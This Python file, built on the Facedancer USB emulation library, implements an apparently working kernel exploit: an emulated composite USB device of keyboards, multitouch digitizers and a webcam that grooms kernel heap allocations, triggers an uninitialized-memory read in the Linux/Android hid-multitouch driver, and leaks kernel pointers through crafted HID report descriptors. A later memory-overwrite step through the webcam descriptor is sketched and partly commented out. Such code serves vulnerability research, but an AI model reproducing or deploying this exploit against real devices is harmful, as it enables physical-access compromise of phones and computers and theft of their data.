#!/usr/bin/env python3
import asyncio
import logging
import struct

from facedancer import main
from facedancer.future import *
from facedancer.future.request import *
from facedancer.classes import *
from facedancer.classes.hid.usage import *
from facedancer.classes.hid.descriptor import *
from facedancer.classes.hid.keyboard import *

"""
A composite device:
- HID:
 - allocate 32k fields C, B, A, error out
   - freelist: A, B, C
- HID (multitouch):
 - dump A
 - freelist: A, B, C
- HID (multitouch):
 - allocate field A
 - dump B
 - freelist: B, C
- HID (multitouch):
 - allocate field B
 - dump C
 - freelist: C
- HID:
 - allocate field C
 - fields for a standard keyboard
- camera
 - overwrite A to point to B
"""

# allocate 32k hid_fields A, B, C

@use_inner_classes_automatically
class InitialHIDReportDescriptor(HIDReportDescriptor):
    fields : tuple = (
        USAGE_PAGE       (HIDUsagePage.GENERIC_DESKTOP),
        USAGE            (HIDGenericDesktopUsage.KEYBOARD),
        COLLECTION       (HIDCollection.APPLICATION),
        USAGE_PAGE       (HIDUsagePage.KEYBOARD),

        # https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/drivers/hid/hid-core.c;l=126;drc=c600a55922640b1c4dcfdc5a694cadd2dd9d1599
        USAGE_MINIMUM    (0),
        USAGE_MAXIMUM    (0x50, 0x02),
        LOGICAL_MINIMUM (0),
        LOGICAL_MAXIMUM (0),
        REPORT_SIZE      (32),
        REPORT_COUNT     (1),
        INPUT            (variable=True),

        USAGE_MINIMUM    (0),
        USAGE_MAXIMUM    (0x50, 0x02),
        LOGICAL_MINIMUM (0),
        LOGICAL_MAXIMUM (0),
        REPORT_SIZE      (32),
        REPORT_COUNT     (1),
        INPUT            (variable=True),

        USAGE_MINIMUM    (0),
        USAGE_MAXIMUM    (0x50, 0x02),
        LOGICAL_MINIMUM (0),
        LOGICAL_MAXIMUM (0),
        REPORT_SIZE      (32),
        REPORT_COUNT     (1),
        INPUT            (variable=True),

        # intentionally error out
        # END_COLLECTION   (),
    )

HID_USAGE_DIGITIZER_PEN = 0x0002
HID_USAGE_DIGITIZER_CONTACTID = 0x51
HID_USAGE_DIGITIZER_INPUTMODE = 0x52
HID_USAGE_VENDOR_DEFINED_WIN8_THQA_BLOB = 0xc5

@use_inner_classes_automatically
class MultitouchInputReportDescriptor(HIDReportDescriptor):
    fields : tuple = (
        USAGE_PAGE       (HIDUsagePage.DIGITIZER),
        USAGE            (HID_USAGE_DIGITIZER_PEN),
        COLLECTION       (HIDCollection.APPLICATION),

        USAGE (HID_USAGE_DIGITIZER_CONTACTID),
        LOGICAL_MINIMUM (0),
        LOGICAL_MAXIMUM (0),
        REPORT_SIZE      (32),
        REPORT_COUNT     (1),
        INPUT            (variable=True),

        # thanks to xyzz for figuring this out.
        # hid-multitouch's mt_feature_mapping gets feature reports if it sees certain usages - for Win8 trackpads on 4.9 and below, for everything on 4.10 and above
        # https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/drivers/hid/hid-multitouch.c;l=493;drc=ae8c533d27e92082d31a2ab62dbb8ea12b345cb8
        # It allocates a buffer with hid_alloc_report_buf and calls GET_REPORT:
        # https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/drivers/hid/hid-multitouch.c;l=474;drc=ae8c533d27e92082d31a2ab62dbb8ea12b345cb8
        # the GET_REPORT can return a report that's too short, but the call to hid_hw_raw_request incorrectly uses the original length allocated:
        # https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/drivers/hid/hid-multitouch.c;l=1515;drc=ae8c533d27e92082d31a2ab62dbb8ea12b345cb8
        # This will cause values to be read from the uninitialized memory.
        # we simulate a Windows 8 trackpad to trigger this on 4.9. (You can probably support down to 4.4 by using both this alongside HID_DG_CONTACTMAX)
        USAGE_PAGE       (0x00, 0xff), # vendor defined
        USAGE (HID_USAGE_VENDOR_DEFINED_WIN8_THQA_BLOB),
        LOGICAL_MINIMUM (0),
        LOGICAL_MAXIMUM (0),
        REPORT_SIZE      (8),
        REPORT_COUNT     (0x00, 0x01),
        FEATURE            (variable=True),

        # we force hid-multitouch to send a SET_REPORT back out by including a HID_USAGE_DIGITIZER_INPUTMODE:
        # https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/drivers/hid/hid-multitouch.c;l=1515;drc=ae8c533d27e92082d31a2ab62dbb8ea12b345cb8
        # https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/drivers/hid/hid-multitouch.c;l=1602;drc=ae8c533d27e92082d31a2ab62dbb8ea12b345cb8
        USAGE_PAGE       (HIDUsagePage.DIGITIZER),
        USAGE (HID_USAGE_DIGITIZER_INPUTMODE),
        LOGICAL_MINIMUM (0),
        LOGICAL_MAXIMUM (0),
        REPORT_SIZE      (8),
        REPORT_COUNT     (1),
        FEATURE            (variable=True),

        # we want this to allocate a 32k buffer
        REPORT_SIZE      (8),
        REPORT_COUNT     (0x00, 0x20),
        FEATURE            (constant=True),
        # 0x4000 (max size) - 0x2000 - 0x100 - 0x1 - 0x1 to just fall below the 16K HID buffer limit; it'll be rounded up
        REPORT_SIZE      (8),
        REPORT_COUNT     (0xfe, 0x1e),
        FEATURE            (constant=True),

        END_COLLECTION   (),
    )

# Same as MultitouchInputReportDescriptor, except with an extra input that takes up 32k
@use_inner_classes_automatically
class MultitouchInputReportWithBigInputFieldDescriptor(HIDReportDescriptor):
    fields : tuple = (
        USAGE_PAGE       (HIDUsagePage.DIGITIZER),
        USAGE            (HID_USAGE_DIGITIZER_PEN),
        COLLECTION       (HIDCollection.APPLICATION),

        USAGE_PAGE       (0xff, 0xff), # vendor defined
        USAGE_MINIMUM    (0),
        USAGE_MAXIMUM    (0x50, 0x02),
        LOGICAL_MINIMUM (0),
        LOGICAL_MAXIMUM (0),
        REPORT_SIZE      (32),
        REPORT_COUNT     (1),
        INPUT            (variable=True),

        USAGE_PAGE       (HIDUsagePage.DIGITIZER),
        USAGE (HID_USAGE_DIGITIZER_CONTACTID),
        LOGICAL_MINIMUM (0),
        LOGICAL_MAXIMUM (0),
        REPORT_SIZE      (32),
        REPORT_COUNT     (1),
        INPUT            (variable=True),

        # thanks to xyzz for figuring this out.
        # hid-multitouch's mt_feature_mapping gets feature reports if it sees certain usages - for Win8 trackpads on 4.9 and below, for everything on 4.10 and above
        # https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/drivers/hid/hid-multitouch.c;l=493;drc=ae8c533d27e92082d31a2ab62dbb8ea12b345cb8
        # It allocates a buffer with hid_alloc_report_buf and calls GET_REPORT:
        # https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/drivers/hid/hid-multitouch.c;l=474;drc=ae8c533d27e92082d31a2ab62dbb8ea12b345cb8
        # the GET_REPORT can return a report that's too short, but the call to hid_hw_raw_request incorrectly uses the original length allocated:
        # https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/drivers/hid/hid-multitouch.c;l=1515;drc=ae8c533d27e92082d31a2ab62dbb8ea12b345cb8
        # This will cause values to be read from the uninitialized memory.
        # we simulate a Windows 8 trackpad to trigger this on 4.9. (You can probably support down to 4.4 by using both this alongside HID_DG_CONTACTMAX)
        USAGE_PAGE       (0x00, 0xff), # vendor defined
        USAGE (HID_USAGE_VENDOR_DEFINED_WIN8_THQA_BLOB),
        LOGICAL_MINIMUM (0),
        LOGICAL_MAXIMUM (0),
        REPORT_SIZE      (8),
        REPORT_COUNT     (0x00, 0x01),
        FEATURE            (variable=True),

        # we force hid-multitouch to send a SET_REPORT back out by including a HID_USAGE_DIGITIZER_INPUTMODE:
        # https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/drivers/hid/hid-multitouch.c;l=1515;drc=ae8c533d27e92082d31a2ab62dbb8ea12b345cb8
        # https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/drivers/hid/hid-multitouch.c;l=1602;drc=ae8c533d27e92082d31a2ab62dbb8ea12b345cb8
        USAGE_PAGE       (HIDUsagePage.DIGITIZER),
        USAGE (HID_USAGE_DIGITIZER_INPUTMODE),
        LOGICAL_MINIMUM (0),
        LOGICAL_MAXIMUM (0),
        REPORT_SIZE      (8),
        REPORT_COUNT     (1),
        FEATURE            (variable=True),

        # we want this to allocate a 32k buffer
        REPORT_SIZE      (8),
        REPORT_COUNT     (0x00, 0x20),
        FEATURE            (constant=True),
        # 0x4000 (max size) - 0x2000 - 0x100 - 0x1 - 0x1 to just fall below the 16K HID buffer limit; it'll be rounded up
        REPORT_SIZE      (8),
        REPORT_COUNT     (0xfe, 0x1e),
        FEATURE            (constant=True),

        END_COLLECTION   (),
    )

# facedancer/devices/keyboard.py's descriptor with LEDs and our read field
# Specifies how many simultaneously keys we want to support.
KEY_ROLLOVER = 8

@use_inner_classes_automatically
class KeyboardReportDescriptor(HIDReportDescriptor):
    fields : tuple = (
        # Identify ourselves as a keyboard.
        USAGE_PAGE       (HIDUsagePage.GENERIC_DESKTOP),
        USAGE            (HIDGenericDesktopUsage.KEYBOARD),
        COLLECTION       (HIDCollection.APPLICATION),
        USAGE_PAGE       (HIDUsagePage.KEYBOARD),

        # Modifier keys.
        # These span the full range of modifier key codes (left control to right meta),
        # and each has two possible values (0 = unpressed, 1 = pressed).
        USAGE_MINIMUM    (KeyboardKeys.LEFTCTRL),
        USAGE_MAXIMUM    (KeyboardKeys.RIGHTMETA),
        LOGICAL_MINIMUM  (0),
        LOGICAL_MAXIMUM  (1),
        REPORT_SIZE      (1),
        REPORT_COUNT     (KeyboardKeys.RIGHTMETA - KeyboardKeys.LEFTCTRL + 1),
        INPUT            (variable=True),

        # One byte of constant zero-padding.
        # This is required for compliance; and Windows will ignore this report
        # if the zero byte isn't present.
        REPORT_SIZE      (8),
        REPORT_COUNT     (1),
        INPUT            (constant=True),

        # Capture our actual, pressed keyboard keys.
        # Support a standard, 101-key keyboard; which has
        # keycodes from 0 (NONE) to 101 (COMPOSE).
        #
        # We provide the capability to press up to eight keys
        # simultaneously. Setting the REPORT_COUNT effectively
        # sets the key rollover; so 8 reports means we can have
        # up to eight keys pressed at once.
        USAGE_MINIMUM    (KeyboardKeys.NONE),
        USAGE_MAXIMUM    (KeyboardKeys.COMPOSE),
        LOGICAL_MINIMUM  (KeyboardKeys.NONE),
        LOGICAL_MAXIMUM  (KeyboardKeys.COMPOSE),

        REPORT_SIZE      (8),
        REPORT_COUNT     (KEY_ROLLOVER),
        INPUT            (),

        # our LED field...
        USAGE_PAGE       (HIDUsagePage.LEDS),
        USAGE_MINIMUM    (1),
        USAGE_MAXIMUM    (5),
        REPORT_SIZE      (1),
        REPORT_COUNT     (5),
        OUTPUT           (variable=True),

        REPORT_SIZE      (1),
        REPORT_COUNT     (3),
        OUTPUT           (constant=True),

        # and our read output field.
        USAGE_PAGE       (0xff, 0xff), # vendor defined
        USAGE_MINIMUM    (0),
        USAGE_MAXIMUM    (0x50, 0x02),
        LOGICAL_MINIMUM  (0),
        LOGICAL_MAXIMUM  (0),
        REPORT_SIZE      (32),
        REPORT_COUNT     (1),
        OUTPUT           (variable=True),

        # End the report.
        END_COLLECTION   (),
    )

USB_SUBCLASS_VIDEO_CONTROL = 1
USB_SUBCLASS_VIDEO_STREAMING = 2
USB_DT_CS_INTERFACE = 0x24

UVC_VC_HEADER = 1

UVC_VS_UNDEFINED = 0
UVC_VS_INPUT_HEADER = 1
UVC_VS_FORMAT_DV = 0x0c

HID_REQ_GET_REPORT = 0x1
HID_REQ_SET_REPORT = 0x9
HID_REQ_SET_IDLE = 0xa

@use_inner_classes_automatically
class UVCStandardControlDescriptor(USBClassDescriptor):
    number: int = 0
    raw: bytes = bytes([
            0x0d, # bLength
            USB_DT_CS_INTERFACE, # bDescriptorType
            UVC_VC_HEADER, # bDescriptorSubtype
            0x00, 0x01, # bcdUVC
            0x0d, 0x00,# wTotalLength
            0x00, 0x00, 0x00, 0x00, # dwClockFrequency
            0x1, # bInCollection
            0x1, # baInterfaceNr(0)
    ])

@use_inner_classes_automatically
class UVCStreamingDescriptor(USBClassDescriptor):
    number: int = 0
    raw: bytes = bytes([
        14, #bLength
        USB_DT_CS_INTERFACE, #bDescriptorType
        UVC_VS_INPUT_HEADER, #bDescriptorSubtype
        1, #bNumFormats
        14 + 9, 0x00, #wTotalLength
        0x82, # bEndpointAddress
        0x00, # bmInfo
        0x02, # bTerminalLink
        0x00, # bStillCaptureMethod
        0x00, # bTriggerSupport
        0x00, # bTriggerUsage
        0x01, # bControlSize
        0x00, # bmaControls(0)
    ]) + bytes([
        9, # bLength
        USB_DT_CS_INTERFACE, # bDescriptorType
        UVC_VS_FORMAT_DV, # bDescriptorSubtype
        0, # 3
        0, # 4
        0, # 5
        0, # 6
        0, # 7
        0, # 8: dv format])
    ])
    """
    + bytes([
        26 + 4*57, # bLength
        USB_DT_CS_INTERFACE, # bDescriptorType
        UVC_VS_UNDEFINED, # bDescriptorSubtype
        1, # bFrameIndex
        0, # bmCapabilities
        0x00, 0x00, # wWidth
        0x00, 0x00, # wHeight
        0x00, 0x00, 0x00, 0x00, # dwMinBitRate
        0x00, 0x00, 0x00, 0x00, # dwMaxBitRate
        0x00, 0x00, 0x00, 0x00, # dwMaxVideoFrameBufferSize
        0x00, 0x00, 0x00, 0x00, # dwDefaultFrameInterval
        57, # bFrameIntervalType
    ] + [0x41, 0x41, 0x41, 0x41]*57 # dwFrameInterval(n)
    )
    """

EXPECTED_HID_FIELD_APPLICATION_VALUE = 0x10006

g_field_a_usage_ptr = 0
g_field_b_usage_ptr = 0
g_field_c_usage_ptr = 0

@use_inner_classes_automatically
class InitialHIDUSBDevice(USBDevice):
    vendor_id: int = 0x04f2
    product_id: int = 0xb071
    class KeyboardConfiguration(USBConfiguration):
        class AllocateThenFailInterface(USBInterface):
            class_number : int = USBDeviceClass.HID
            class KeyEventEndpoint(USBEndpoint):
                number        : int             = 3
                direction     : USBDirection    = USBDirection.IN
                transfer_type : USBTransferType = USBTransferType.INTERRUPT
                interval      : int             = 10
            class USBClassDescriptor(USBClassDescriptor):
                number      : int   =  USBDescriptorTypeNumber.HID
                raw         : bytes = b'\x09\x21\x10\x01\x00\x01\x22' + struct.pack("<H", len(InitialHIDReportDescriptor()()))
            class ReportDescriptor(InitialHIDReportDescriptor):
                pass

            @class_request_handler(number=HID_REQ_SET_IDLE)
            @to_this_interface
            def handle_get_interface_request(self, request):
                # Silently stall HID_REQ_SET_IDLE class requests.
                request.stall()

        class MultitouchDumpAInterface(USBInterface):
            class_number : int = USBDeviceClass.HID
            number: int = 1
            class KeyEventEndpoint(USBEndpoint):
                number        : int             = 4
                direction     : USBDirection    = USBDirection.IN
                transfer_type : USBTransferType = USBTransferType.INTERRUPT
                interval      : int             = 10
            class USBClassDescriptor(USBClassDescriptor):
                number      : int   =  USBDescriptorTypeNumber.HID
                raw         : bytes = b'\x09\x21\x10\x01\x00\x01\x22' + struct.pack("<H", len(MultitouchInputReportDescriptor()()))
            class ReportDescriptor(MultitouchInputReportDescriptor):
                pass

            @class_request_handler(number=HID_REQ_SET_IDLE)
            @to_this_interface
            def handle_get_interface_request(self, request):
                # Silently stall HID_REQ_SET_IDLE class requests.
                request.stall()

            @class_request_handler(number=HID_REQ_GET_REPORT)
            @to_this_interface
            def handle_hid_get_report(self, request: USBControlRequest):
                # return 0 bytes - the rest of the report will be read from uninitialized memory
                request.reply(bytes([]))

            @class_request_handler(number=HID_REQ_SET_REPORT)
            @to_this_interface
            def handle_hid_set_report(self, request: USBControlRequest):
                global g_field_a_usage_ptr
                outdata = bytearray(request.length)
                request.reply(outdata)
                print(outdata[:256].hex(' ', 4))
                # 8 bytes of header, then the leaked struct hid_usage
                # unsigned application // 0x8
                # struct hid_usage *usage // 0x10
                application = struct.unpack("<I", outdata[0x8+0x8:0x8+0x8+0x4])[0]
                usage_ptr = struct.unpack("<Q", outdata[0x8+0x10:0x8+0x10+0x8])[0]
                print(hex(application), hex(usage_ptr))
                # application should be 0x10006 (GENERIC_DESKTOP, KEYBOARD)
                if application == EXPECTED_HID_FIELD_APPLICATION_VALUE:
                    g_field_a_usage_ptr = usage_ptr

        class MultitouchDumpBInterface(USBInterface):
            class_number : int = USBDeviceClass.HID
            number: int = 2
            class KeyEventEndpoint(USBEndpoint):
                number        : int             = 5
                direction     : USBDirection    = USBDirection.IN
                transfer_type : USBTransferType = USBTransferType.INTERRUPT
                interval      : int             = 10
            class USBClassDescriptor(USBClassDescriptor):
                number      : int   =  USBDescriptorTypeNumber.HID
                raw         : bytes = b'\x09\x21\x10\x01\x00\x01\x22' + struct.pack("<H", len(MultitouchInputReportWithBigInputFieldDescriptor()()))
            class ReportDescriptor(MultitouchInputReportWithBigInputFieldDescriptor):
                pass

            @class_request_handler(number=HID_REQ_SET_IDLE)
            @to_this_interface
            def handle_get_interface_request(self, request):
                # Silently stall HID_REQ_SET_IDLE class requests.
                request.stall()

            @class_request_handler(number=HID_REQ_GET_REPORT)
            @to_this_interface
            def handle_hid_get_report(self, request: USBControlRequest):
                # return 0 bytes - the rest of the report will be read from uninitialized memory
                request.reply(bytes([]))

            @class_request_handler(number=HID_REQ_SET_REPORT)
            @to_this_interface
            def handle_hid_set_report(self, request: USBControlRequest):
                global g_field_b_usage_ptr
                outdata = bytearray(request.length)
                request.reply(outdata)
                print(outdata[:256].hex(' ', 4))
                # 8 bytes of header, then the leaked struct hid_usage
                # unsigned application // 0x8
                # struct hid_usage *usage // 0x10
                application = struct.unpack("<I", outdata[0x8+0x8:0x8+0x8+0x4])[0]
                usage_ptr = struct.unpack("<Q", outdata[0x8+0x10:0x8+0x10+0x8])[0]
                print(hex(application), hex(usage_ptr))
                # application should be 0x10006 (GENERIC_DESKTOP, KEYBOARD)
                if application == EXPECTED_HID_FIELD_APPLICATION_VALUE:
                    g_field_b_usage_ptr = usage_ptr
        class MultitouchDumpCInterface(USBInterface):
            class_number : int = USBDeviceClass.HID
            number: int = 3
            class KeyEventEndpoint(USBEndpoint):
                number        : int             = 6
                direction     : USBDirection    = USBDirection.IN
                transfer_type : USBTransferType = USBTransferType.INTERRUPT
                interval      : int             = 10
            class USBClassDescriptor(USBClassDescriptor):
                number      : int   =  USBDescriptorTypeNumber.HID
                raw         : bytes = b'\x09\x21\x10\x01\x00\x01\x22' + struct.pack("<H", len(MultitouchInputReportWithBigInputFieldDescriptor()()))
            class ReportDescriptor(MultitouchInputReportWithBigInputFieldDescriptor):
                pass

            @class_request_handler(number=HID_REQ_SET_IDLE)
            @to_this_interface
            def handle_get_interface_request(self, request):
                # Silently stall HID_REQ_SET_IDLE class requests.
                request.stall()

            @class_request_handler(number=HID_REQ_GET_REPORT)
            @to_this_interface
            def handle_hid_get_report(self, request: USBControlRequest):
                # return 0 bytes - the rest of the report will be read from uninitialized memory
                request.reply(bytes([]))

            @class_request_handler(number=HID_REQ_SET_REPORT)
            @to_this_interface
            def handle_hid_set_report(self, request: USBControlRequest):
                global g_field_c_usage_ptr
                outdata = bytearray(request.length)
                request.reply(outdata)
                print(outdata[:256].hex(' ', 4))
                # 8 bytes of header, then the leaked struct hid_usage
                # unsigned application // 0x8
                # struct hid_usage *usage // 0x10
                application = struct.unpack("<I", outdata[0x8+0x8:0x8+0x8+0x4])[0]
                usage_ptr = struct.unpack("<Q", outdata[0x8+0x10:0x8+0x10+0x8])[0]
                print(hex(application), hex(usage_ptr))
                # application should be 0x10006 (GENERIC_DESKTOP, KEYBOARD)
                if application == EXPECTED_HID_FIELD_APPLICATION_VALUE:
                    g_field_c_usage_ptr = usage_ptr

        class KeyboardInterface(USBInterface):
            class_number : int = USBDeviceClass.HID
            number: int = 4
            class KeyEventEndpoint(USBEndpoint):
                number        : int             = 7
                direction     : USBDirection    = USBDirection.IN
                transfer_type : USBTransferType = USBTransferType.INTERRUPT
                interval      : int             = 10
            class USBClassDescriptor(USBClassDescriptor):
                number      : int   =  USBDescriptorTypeNumber.HID
                raw         : bytes = b'\x09\x21\x10\x01\x00\x01\x22' + struct.pack("<H", len(KeyboardReportDescriptor()()))
            class ReportDescriptor(KeyboardReportDescriptor):
                pass

            @class_request_handler(number=HID_REQ_SET_IDLE)
            @to_this_interface
            def handle_get_interface_request(self, request):
                # Silently stall HID_REQ_SET_IDLE class requests.
                request.stall()

            @class_request_handler(number=HID_REQ_SET_REPORT)
            @to_this_interface
            def handle_hid_set_report(self, request: USBControlRequest):
                outdata = bytearray(request.length)
                request.reply(outdata)
                # TODO(zhuowei): doesn't work...
                print(outdata.hex(' '))
        class USBWebcamControlInterface(USBInterface):
            number : int = 5
            class_number    : int = USBDeviceClass.VIDEO
            subclass_number    : int = USB_SUBCLASS_VIDEO_CONTROL
            class ReportDescriptor(UVCStandardControlDescriptor):
                pass
        class USBWebcamStreamingInterface(USBInterface):
            number : int = 6
            class_number    : int = USBDeviceClass.VIDEO
            subclass_number    : int = USB_SUBCLASS_VIDEO_STREAMING
            class ReportDescriptor(UVCStreamingDescriptor):
                # TODO(zhuowei): modify based on addresses...
                pass

async def run_monterey_jack():
    logging.info("Beginning Monterey Jack...")

main(InitialHIDUSBDevice, run_monterey_jack())